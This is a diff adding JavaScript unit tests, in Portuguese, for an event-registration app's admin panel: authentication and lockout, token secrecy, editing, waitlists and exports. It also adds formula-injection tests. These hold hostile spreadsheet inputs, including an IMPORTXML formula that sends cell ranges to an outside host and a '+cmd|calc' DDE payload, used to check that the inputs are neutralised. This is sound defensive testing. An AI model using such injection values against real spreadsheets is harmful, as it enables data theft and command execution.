@@ -369,5 +369,128 @@ test('prepare-gas: envia só os .gs separados, sem dist/, e grava a versão do c
   assert(/CODIGO_VERSAO = 'deadbee'/.test(fs.readFileSync(path.join(dir, 'Versao.gs'), 'utf8')));
 });
 
+console.log('Painel de administração');
+function admin(extra) {
+  const e = cenario(); e.setCfg('PIN_ADMIN', 'senhaForte123');
+  e.adm = (acao, campos) => e.ctx.handleSeguro_(Object.assign({ action: acao, pin: 'senhaForte123', operador: 'Admin Teste' }, campos));
+  return e;
+}
+test('senha do admin: ausente, fraca/igual ao PIN do scanner, errada e bloqueio por tentativas', () => {
+  const e = cenario();
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'x' }).code, 'SEM_PIN');
+  e.setCfg('PIN_ADMIN', '1234567'); assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: '1234567' }).code, 'FRACO');
+  e.setCfg('PIN', 'senhaForte123'); e.setCfg('PIN_ADMIN', 'senhaForte123'); assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'senhaForte123' }).code, 'FRACO');
+  e.setCfg('PIN', '4321');
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'errada' }).code, 'INVALIDO');
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'senhaForte123' }).ok, true);
+  for (let n = 0; n < 8; n++) e.ctx.handleSeguro_({ action: 'admin_login', pin: 'errada' });
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_login', pin: 'senhaForte123' }).code, 'BLOQUEADO');
+});
+test('falha de autenticação é marcada (auth) e erro de validação não', () => {
+  const e = admin();
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_resumo', pin: 'x' }).auth, true);
+  const v = e.adm('admin_editar', { id: e.insc(1).id, campos: { email: 'ruim' } }); assert.strictEqual(v.ok, false); assert.strictEqual(v.auth, undefined);
+});
+test('o PIN do scanner NÃO abre o painel e a senha do admin NÃO abre o scanner', () => {
+  const e = admin(); e.setCfg('PIN', '4321');
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_resumo', pin: '4321' }).ok, false);
+  assert.strictEqual(e.ctx.scanLista_({ pin: 'senhaForte123' }).ok, false);
+});
+test('ações de escrita exigem o nome do operador', () => {
+  const e = admin();
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_set_inscricoes', pin: 'senhaForte123', valor: 'FECHADAS' }).code, 'OPERADOR');
+  assert.strictEqual(e.adm('admin_resumo').ok, true);
+});
+test('resumo e busca (nome sem acento, matrícula, e-mail); token nunca é devolvido', () => {
+  const e = admin(); const r = e.adm('admin_resumo');
+  assert.strictEqual(r.inscritosAtivos, 5); assert.strictEqual(r.inscricoesAbertas, true); assert.strictEqual(r.porCurso[0][1], 5);
+  e.ctx.updateRow_('Inscritos', 2, { nome: 'José da Conceição' });
+  assert.strictEqual(e.adm('admin_buscar', { q: 'jose conceicao'.split(' ')[0] }).resultados.length >= 1, true);
+  assert.strictEqual(e.adm('admin_buscar', { q: 'conceicao' }).resultados[0].nome, 'José da Conceição');
+  assert.strictEqual(e.adm('admin_buscar', { q: '20240003' }).resultados.length, 1);
+  assert.strictEqual(e.adm('admin_buscar', { q: 'p4@exemplo' }).resultados.length, 1);
+  assert.strictEqual(e.adm('admin_buscar', { q: 'a' }).resultados.length, 0);
+  assert(!JSON.stringify(e.adm('admin_buscar', { q: 'pessoa' })).includes(e.token(1)), 'token vazou na busca');
+  assert(!JSON.stringify(e.adm('admin_ficha', { id: e.insc(1).id })).includes(e.token(1)), 'token vazou na ficha');
+});
+test('ficha traz atividades, fila, presenças, portaria e e-mails', () => {
+  const e = admin(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
+  e.ctx.scanLote_({ pin: (e.setCfg('PIN', '4321'), '4321'), itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', token: e.token(3), clientId: 'c1', operador: 'Ana' }] });
+  const f = e.adm('admin_ficha', { id: e.insc(3).id });
+  assert.strictEqual(f.atividades[0].status, 'FILA'); assert.strictEqual(f.atividades[0].posicao, 1);
+  assert.strictEqual(f.portaria.length, 1); assert(f.emails.length >= 1);
+});
+test('editar: valida, protege matrícula única e reenvia o QR quando o e-mail muda; registra no Log', () => {
+  const e = admin(); const id = e.insc(1).id; e.sent.length = 0;
+  assert.strictEqual(e.adm('admin_editar', { id, campos: { email: 'ruim' } }).erros.email !== undefined, true);
+  assert.strictEqual(e.adm('admin_editar', { id, campos: { matricula: '20240002' } }).erros.matricula !== undefined, true);
+  const r = e.adm('admin_editar', { id, campos: { nome: '  Maria   Souza Lima ', email: 'Novo@Exemplo.com' } });
+  assert.strictEqual(r.ok, true); assert.strictEqual(r.emailReenviado, true);
+  assert.strictEqual(e.insc(1).nome, 'Maria Souza Lima'); assert.strictEqual(e.insc(1).email, 'novo@exemplo.com');
+  assert(e.sent.some(m => m.to === 'novo@exemplo.com'));
+  assert(e.tabela('Log').some(l => l.evento === 'admin_editar' && /Admin Teste/.test(l.detalhe) && /novo@exemplo/.test(l.detalhe)));
+  assert.strictEqual(e.adm('admin_editar', { id, campos: { nome: 'Maria Souza Lima' } }).semMudancas, true);
+});
+test('cancelar inscrição libera vaga e promove a fila; reativar; reenviar QR; cancelar vaga', () => {
+  const e = admin(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
+  const r = e.adm('admin_cancelar_inscrito', { id: e.insc(1).id });
+  assert.strictEqual(r.ok, true); assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA');
+  assert.strictEqual(e.adm('admin_reativar_inscrito', { id: e.insc(1).id }).ok, true); assert.strictEqual(e.insc(1).status, 'ATIVA');
+  e.sent.length = 0; assert.strictEqual(e.adm('admin_reenviar_qr', { id: e.insc(1).id }).ok, true); assert(e.emailsDe(1).length === 1);
+  const ia = e.tabela('Inscricoes_Atividades').find(x => x.inscrito_id === e.insc(2).id && x.status === 'CONFIRMADA');
+  assert.strictEqual(e.adm('admin_vaga_cancelar', { iaId: ia.id }).ok, true);
+  assert.strictEqual(e.adm('admin_inscrever', { id: e.insc(4).id, atividadeId: 'A16' }).ok, true);
+});
+test('atividades: listar, editar vagas (promove a fila), abrir/fechar e rejeitar valores inválidos', () => {
+  const e = admin(); [1, 2, 3, 4].forEach(n => e.enroll(n, 'A16'));
+  const lista = e.adm('admin_atividades').atividades.find(a => a.id === 'A16');
+  assert.deepStrictEqual([lista.vagas_max, lista.ocupadas, lista.na_fila, lista.aberta], [2, 2, 2, true]);
+  assert.strictEqual(e.adm('admin_atividade_set', { id: 'A16', campos: { vagas_max: 'abc' } }).ok, false);
+  assert.strictEqual(e.adm('admin_atividade_set', { id: 'A16', campos: { vagas_max: -1 } }).ok, false);
+  assert.strictEqual(e.adm('admin_atividade_set', { id: 'A16', campos: { vagas_max: 3 } }).ok, true);
+  assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA'); assert.strictEqual(e.status(4, 'A16'), 'FILA:1');
+  e.adm('admin_atividade_set', { id: 'A16', campos: { aberta: false, vagas_max: '' } });
+  assert.strictEqual(e.ctx.getAtividade_('A16').inscricoes_abertas, 'NAO');
+  assert.strictEqual(e.status(4, 'A16'), 'CONFIRMADA', 'sem limite promove todos');
+  const l = e.adm('admin_atividade_lista', { id: 'A16' }); assert.strictEqual(l.inscritos.length, 4);
+});
+test('abrir/fechar inscrições do evento pelo painel reflete no site', () => {
+  const e = admin();
+  assert.strictEqual(e.adm('admin_set_inscricoes', { valor: 'FECHADAS' }).inscricoesAbertas, false);
+  assert.strictEqual(e.ctx.handleSeguro_({ action: 'config' }).inscricoesAbertas, false);
+  assert.strictEqual(e.adm('admin_set_inscricoes', { valor: 'TALVEZ' }).ok, false);
+  e.adm('admin_set_inscricoes', { valor: 'ABERTAS' }); assert.strictEqual(e.ctx.handleSeguro_({ action: 'config' }).inscricoesAbertas, true);
+});
+test('alertas, fila de e-mails e reprocessamento', () => {
+  const e = admin(); e.state.quota = 0; e.reg(9); e.state.quota = 100;
+  const a = e.adm('admin_alertas'); assert(a.alertas.some(x => x.tipo === 'COTA_EMAIL')); assert(a.emailsPendentes.length >= 1);
+  const r = e.adm('admin_reprocessar'); assert(r.enviados >= 1); assert.strictEqual(e.adm('admin_alertas').emailsPendentes.length, 0);
+});
+test('exportação: tabelas permitidas, sem a coluna token, base de análise atualizada', () => {
+  const e = admin();
+  const t = e.adm('admin_tabela', { nome: 'inscritos' }); assert(!t.headers.includes('token')); assert.strictEqual(t.rows.length, 5);
+  assert.strictEqual(e.adm('admin_tabela', { nome: 'base' }).rows.length, 5);
+  assert.strictEqual(e.adm('admin_tabela', { nome: 'Config' }).ok, false);
+  assert.strictEqual(e.adm('admin_tabela', { nome: 'certificados' }).ok, true);
+});
+
+console.log('Segurança dos dados');
+test('injeção de fórmula: =, +, -, @ no início de nome/curso/e-mail/operador são neutralizados', () => {
+  const e = novo(); e.abrir(); e.setCfg('PIN', '4321');
+  const r = e.reg(1, { nome: '=IMPORTXML("http://x.com/"&A2:F9,"//a") Silva', curso: '+cmd|calc', email: '=x@exemplo.com' });
+  assert.strictEqual(r.ok, true);
+  const i = e.insc(1); assert(!/^[=+\-@]/.test(i.nome) && !/^[=+\-@]/.test(i.curso) && !/^[=@]/.test(i.email), JSON.stringify([i.nome, i.curso, i.email]));
+  e.ctx.scanLote_({ pin: '4321', itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', token: i.token, clientId: 'z1', operador: '=HYPERLINK("http://x")' }] });
+  assert(!/^[=+\-@]/.test(e.tabela('Portaria')[0].operador));
+  e.setCfg('PIN_ADMIN', 'senhaForte123'); e.ctx.handleSeguro_({ action: 'admin_set_inscricoes', pin: 'senhaForte123', operador: '=1+1', valor: 'ABERTAS' });
+  assert(!/^[=+\-@]/.test(e.tabela('Log').filter(l => l.evento === 'admin_set_inscricoes')[0].detalhe));
+});
+test('colunas de texto livre ficam formatadas como texto na planilha', () => {
+  const e = novo(); const fmt = [];
+  const Sh = e.sheets['Inscritos'].constructor; const orig = Sh.prototype.getRange;
+  e.ctx.TEXT_COLUMNS['Inscritos'].forEach(c => fmt.push(c));
+  ['nome', 'curso', 'periodo', 'email'].forEach(c => assert(fmt.includes(c), c));
+});
+
 console.log(`\n${passed} ok, ${failed} falharam`);
 process.exit(failed ? 1 : 0);
